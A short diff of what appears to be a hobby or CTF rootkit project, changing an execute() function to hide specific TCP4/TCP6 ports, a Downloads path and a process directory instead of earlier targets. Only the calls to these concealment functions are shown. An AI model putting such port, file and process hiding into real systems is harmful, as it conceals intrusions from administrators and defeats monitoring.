@@ -29,10 +29,11 @@ void execute() {
 //    rootkit.run_plugin(remote_cli_id);
 
 
-    hide_tcp_port(8808);
-    hide_absolute_path("/home/idan/ctf");
+    hide_tcp4_port(1234);
+    hide_tcp6_port(63342);
+    hide_absolute_path("/home/idan/Downloads");
 //    hide_absolute_path("/home/idan"); // can't do that, clion freaks out
-//    hide_absolute_path("/proc/2906");
+    hide_process_dir(1234);
 
     reports_test();
 
